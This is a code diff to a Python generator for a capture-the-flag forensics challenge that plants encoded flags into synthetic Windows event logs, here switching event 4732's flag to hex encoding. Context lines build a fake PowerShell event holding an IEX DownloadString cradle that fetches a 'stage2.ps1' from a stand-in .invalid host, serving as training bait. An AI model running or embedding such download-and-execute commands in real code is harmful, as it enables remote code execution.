@@ -28,6 +28,7 @@ from typing import Optional
 from faker import Faker
 
 from poligon.core.templates.android import encode_flag
+from poligon.core.templates.evidence import _hex
 
 ZIP_NAME = "challenge.zip"
 EVENTS_NAME = "events.json"
@@ -186,15 +187,17 @@ def _event_data(fake: Faker, event_id: int, user: str,
 
 def _plant_flag(fake: Faker, data: dict, event_id: int, flag: str) -> None:
     """Overwrite the event's flag field with a value holding base64(flag) —
-    never the raw flag (INV-P1)."""
+    or hex(flag) in the 4732 DN, where base64's "+" / "=" would need AD
+    escaping — never the raw flag (INV-P1)."""
     field = HIGH_VALUE_IDS[event_id][1]
+    if event_id == 4732:
+        data[field] = f"CN={_hex(flag)},CN=Users,DC=corp,DC=example"
+        return
     flag = encode_flag(flag)
     if event_id == 4104:
         data[field] = (f"$key = '{flag}'\n"
                        f"IEX (New-Object Net.WebClient).DownloadString("
                        f"'http://{fake.domain_word()}.invalid/stage2.ps1')")
-    elif event_id == 4732:
-        data[field] = f"CN={flag},CN=Users,DC=corp,DC=example"
     elif event_id == 1:
         data["Image"] = "C:\\Windows\\System32\\cmd.exe"
         data[field] = f"cmd.exe /c echo {flag} > C:\\Users\\Public\\note.txt"
